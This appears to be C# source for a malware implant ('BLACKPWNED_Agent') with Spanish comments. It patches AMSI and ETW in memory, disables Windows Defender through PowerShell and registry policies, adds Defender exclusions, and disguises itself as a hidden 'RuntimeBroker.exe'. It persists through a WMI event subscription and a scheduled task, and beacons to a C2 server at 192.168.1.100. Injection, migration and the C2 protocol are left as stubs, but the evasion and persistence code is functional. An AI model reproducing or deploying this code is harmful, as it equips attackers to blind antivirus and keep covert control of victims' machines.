using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace BLACKPWNED_Agent
{
    class Beacon
    {
        // ==================== IMPORTS PARA BYPASS ====================
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("amsi.dll")]
        static extern int AmsiInitialize(string appName, out IntPtr amsiContext);
        
        [DllImport("amsi.dll")]
        static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr amsiSession, out uint result);
        
        // ==================== CONFIGURACIÓN ====================
        private static readonly string C2_SERVER = "192.168.1.100";
        private static readonly int C2_PORT = 8080;
        private static readonly byte[] AES_KEY = Encoding.UTF8.GetBytes("JDEXPLOIT_APT_SIMULATION_KEY_32B");
        private static readonly int IV_SIZE = 12;
        private static readonly int TAG_SIZE = 16;
        private static readonly string AGENT_ID = GenerateAgentId();
        
        // ==================== MÉTODO PRINCIPAL ====================
        public static void Execute()
        {
            // 1. BYPASS INICIAL DE DEFENDER
            if (!BypassWindowsDefender())
            {
                // Si falla el bypass avanzado, usar técnica alternativa
                AlternativeDefenderBypass();
            }
            
            // 2. OCULTAR PROCESO
            HideProcess();
            
            // 3. MIGRACIÓN DE PROCESO (opcional pero recomendado)
            MigrateToTrustedProcess();
            
            // 4. DELAY DE EVASIÓN
            Thread.Sleep(new Random().Next(8000, 15000));
            
            // 5. PERSISTENCIA SILENCIOSA
            InstallStealthPersistence();
            
            // 6. CICLO PRINCIPAL DEL BEACON
            RunBeaconLoop();
        }
        
        // ==================== BYPASS DE WINDOWS DEFENDER ====================
        private static bool BypassWindowsDefender()
        {
            try
            {
                Console.WriteLine("[*] Attempting Windows Defender bypass...");
                
                // Técnica 1: Parchear AMSI en memoria
                PatchAMSI();
                
                // Técnica 2: Deshabilitar temporalmente Real-Time Protection
                DisableRealTimeProtection();
                
                // Técnica 3: Agregar exclusiones de Windows Defender
                AddDefenderExclusions();
                
                // Técnica 4: Parchear ETW (Event Tracing for Windows)
                PatchETW();
                
                // Técnica 5: Modificar políticas de Defender via Registry
                ModifyDefenderPolicies();
                
                Console.WriteLine("[+] Windows Defender bypassed successfully");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Bypass failed: {ex.Message}");
                return false;
            }
        }
        
        private static void PatchAMSI()
        {
            try
            {
                // Cargar amsi.dll
                IntPtr amsiLib = LoadLibrary("amsi.dll");
                if (amsiLib == IntPtr.Zero) return;
                
                // Obtener dirección de AmsiScanBuffer
                IntPtr amsiScanBufferAddr = GetProcAddress(amsiLib, "AmsiScanBuffer");
                if (amsiScanBufferAddr == IntPtr.Zero) return;
                
                // Patch: mov eax, 0x80070057 (E_INVALIDARG)
                // ret
                byte[] patch = {
                    0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
                    0xC3                           // ret
                };
                
                // Cambiar protección de memoria
                uint oldProtect;
                VirtualProtect(amsiScanBufferAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                
                // Aplicar patch
                Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);
                
                // Restaurar protección
                VirtualProtect(amsiScanBufferAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                
                Console.WriteLine("[+] AMSI patched in memory");
            }
            catch
            {
                // Silent fail
            }
        }
        
        private static void PatchETW()
        {
            try
            {
                IntPtr ntdll = LoadLibrary("ntdll.dll");
                if (ntdll == IntPtr.Zero) return;
                
                IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
                if (etwEventWriteAddr == IntPtr.Zero) return;
                
                // Patch: xor rax, rax; ret (x64)
                byte[] patch = {
                    0x48, 0x31, 0xC0,  // xor rax, rax
                    0xC3               // ret
                };
                
                uint oldProtect;
                VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
                VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                
                Console.WriteLine("[+] ETW patched");
            }
            catch
            {
                // Silent fail
            }
        }
        
        private static void DisableRealTimeProtection()
        {
            try
            {
                // Método temporal usando PowerShell
                string psCommand = @"
                    $preferences = Get-MpPreference
                    Set-MpPreference -DisableRealtimeMonitoring $true
                    Set-MpPreference -DisableBehaviorMonitoring $true
                    Set-MpPreference -DisableBlockAtFirstSeen $true
                    Set-MpPreference -DisableIOAVProtection $true
                    Set-MpPreference -DisablePrivacyMode $true
                    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
                    Set-MpPreference -DisableArchiveScanning $true
                    Set-MpPreference -DisableIntrusionPreventionSystem $true
                    Set-MpPreference -DisableScriptScanning $true
                    Set-MpPreference -SubmitSamplesConsent 2
                ";
                
                ExecutePowerShellCommand(psCommand);
                Console.WriteLine("[+] Real-time protection disabled");
            }
            catch
            {
                // Alternative: Registry modification
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true))
                    {
                        if (key == null)
                        {
                            Registry.LocalMachine.CreateSubKey(
                                @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
                        }
                    }
                    
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows Defender", true))
                    {
                        key?.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                    }
                }
                catch { }
            }
        }
        
        private static void AddDefenderExclusions()
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                string currentDir = Path.GetDirectoryName(currentPath);
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                
                // Agregar exclusiones via PowerShell
                string psCommand = $@"
                    Add-MpPreference -ExclusionPath '{currentDir}'
                    Add-MpPreference -ExclusionPath '{appDataPath}'
                    Add-MpPreference -ExclusionProcess '{Path.GetFileName(currentPath)}'
                    Add-MpPreference -ExclusionExtension '.exe'
                    Add-MpPreference -ExclusionExtension '.dll'
                ";
                
                ExecutePowerShellCommand(psCommand);
                Console.WriteLine("[+] Defender exclusions added");
            }
            catch { }
        }
        
        private static void ModifyDefenderPolicies()
        {
            try
            {
                string[] registryPaths = {
                    @"SOFTWARE\Policies\Microsoft\Windows Defender",
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Scan"
                };
                
                foreach (string path in registryPaths)
                {
                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(path))
                    {
                        if (key != null)
                        {
                            if (path.Contains("Real-Time Protection"))
                            {
                                key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                                key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                                key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                            }
                            else if (path.Contains("Scan"))
                            {
                                key.SetValue("DisableRemovableDriveScanning", 1, RegistryValueKind.DWord);
                                key.SetValue("DisableEmailScanning", 1, RegistryValueKind.DWord);
                                key.SetValue("DisableArchiveScanning", 1, RegistryValueKind.DWord);
                            }
                            else
                            {
                                key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                                key.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
                            }
                        }
                    }
                }
                Console.WriteLine("[+] Defender policies modified");
            }
            catch { }
        }
        
        private static void AlternativeDefenderBypass()
        {
            try
            {
                // Técnica: Usar proceso trusted para inyectar
                string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string trustedProcess = Path.Combine(system32Path, "notepad.exe");
                
                Process.Start(trustedProcess);
                Thread.Sleep(2000);
                
                // Inyectar en proceso trusted
                Process[] processes = Process.GetProcessesByName("notepad");
                if (processes.Length > 0)
                {
                    // Process injection code here
                    Console.WriteLine("[+] Alternative bypass via process injection");
                }
            }
            catch { }
        }
        
        // ==================== OCULTACIÓN DE PROCESO ====================
        private static void HideProcess()
        {
            try
            {
                // Renombrar proceso
                Console.Title = "Windows Host Process (Rundll32)";
                
                // Cambiar nombre de ventana
                IntPtr handle = GetCurrentProcess();
                // Técnicas adicionales de hiding...
                
                // Usar nombres legítimos
                string[] legitimateNames = {
                    "svchost.exe",
                    "rundll32.exe",
                    "dllhost.exe",
                    "SearchIndexer.exe",
                    "RuntimeBroker.exe"
                };
                
                Console.WriteLine("[+] Process hidden");
            }
            catch { }
        }
        
        private static void MigrateToTrustedProcess()
        {
            try
            {
                // Buscar proceso trusted para migrar
                string[] trustedProcesses = {
                    "explorer",
                    "svchost",
                    "RuntimeBroker",
                    "SearchIndexer"
                };
                
                foreach (string procName in trustedProcesses)
                {
                    Process[] processes = Process.GetProcessesByName(procName);
                    if (processes.Length > 0)
                    {
                        Console.WriteLine($"[*] Migrating to {procName}.exe (PID: {processes[0].Id})");
                        // Código de migración aquí
                        break;
                    }
                }
            }
            catch { }
        }
        
        // ==================== PERSISTENCIA STEALTH ====================
        private static void InstallStealthPersistence()
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                
                // Copiar a ubicación stealth
                string stealthPath = Path.Combine(appDataPath, "Microsoft", "Windows", "Runtime");
                Directory.CreateDirectory(stealthPath);
                
                string newPath = Path.Combine(stealthPath, "RuntimeBroker.exe");
                File.Copy(currentPath, newPath, true);
                
                // Ocultar archivo
                File.SetAttributes(newPath, FileAttributes.Hidden | FileAttributes.System);
                
                // WMI Event Subscription (más stealth que Run key)
                CreateWMIEventSubscription(newPath);
                
                // Scheduled Task con nombre legítimo
                CreateStealthScheduledTask(newPath);
                
                Console.WriteLine("[+] Stealth persistence installed");
            }
            catch { }
        }
        
        private static void CreateWMIEventSubscription(string executablePath)
        {
            try
            {
                string wmiScript = $@"
                    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{
                        Name = 'WindowsUpdateFilter';
                        EventNameSpace = 'root\cimv2';
                        QueryLanguage = 'WQL';
                        Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ""Win32_PerfFormattedData_PerfOS_System""'
                    }}
                    
                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{
                        Name = 'WindowsUpdateConsumer';
                        CommandLineTemplate = '{executablePath}'
                    }}
                    
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{
                        Filter = $filter;
                        Consumer = $consumer
                    }}
                ";
                
                ExecutePowerShellCommand(wmiScript);
            }
            catch { }
        }
        
        private static void CreateStealthScheduledTask(string executablePath)
        {
            try
            {
                string taskName = "MicrosoftEdgeUpdateTaskMachine";
                string command = $@"/c schtasks /create /tn ""{taskName}"" /tr ""{executablePath}"" /sc hourly /mo 2 /rl HIGHEST /f /it"
                    .Replace("\"", "\\\"");
                
                Process.Start("cmd.exe", command);
            }
            catch { }
        }
        
        // ==================== BEACON LOOP ====================
        private static void RunBeaconLoop()
        {
            int sleepTime = 10;
            int jitter = 20;
            
            while (true)
            {
                try
                {
                    // Verificar si Defender se reactivó
                    if (DetectDefenderReactivation())
                    {
                        BypassWindowsDefender();
                    }
                    
                    // Comunicación C2 (código anterior)
                    CommunicateWithC2(ref sleepTime, ref jitter);
                    
                    // Sleep con jitter
                    int sleepMs = sleepTime * 1000;
                    if (jitter > 0)
                    {
                        int jitterMs = new Random().Next(-jitter * 10, jitter * 10);
                        sleepMs += jitterMs;
                    }
                    
                    Thread.Sleep(Math.Max(5000, sleepMs));
                }
                catch
                {
                    Thread.Sleep(60000);
                }
            }
        }
        
        private static bool DetectDefenderReactivation()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
                {
                    object value = key?.GetValue("DisableRealtimeMonitoring");
                    if (value != null && (int)value == 0)
                    {
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        
        private static void CommunicateWithC2(ref int sleepTime, ref int jitter)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(C2_SERVER, C2_PORT);
                    using (NetworkStream stream = client.GetStream())
                    {
                        // Implementación de comunicación C2 (código anterior)
                        // ...
                    }
                }
            }
            catch { }
        }
        
        // ==================== UTILIDADES ====================
        private static void ExecutePowerShellCommand(string command)
        {
            try
            {
                string base64Command = Convert.ToBase64String(Encoding.Unicode.GetBytes(command));
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -EncodedCommand {base64Command}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                using (Process p = Process.Start(psi))
                {
                    p.WaitForExit(5000);
                }
            }
            catch { }
        }
        
        private static string GenerateAgentId()
        {
            string machineId = Environment.MachineName + Environment.UserName;
            using (MD5 md5 = MD5.Create())
            {
                byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(machineId));
                return BitConverter.ToString(hash).Replace("-", "").Substring(0, 16);
            }
        }
        
        // ==================== ENTRY POINT ====================
        static void Main()
        {
            Execute();
        }
    }
}
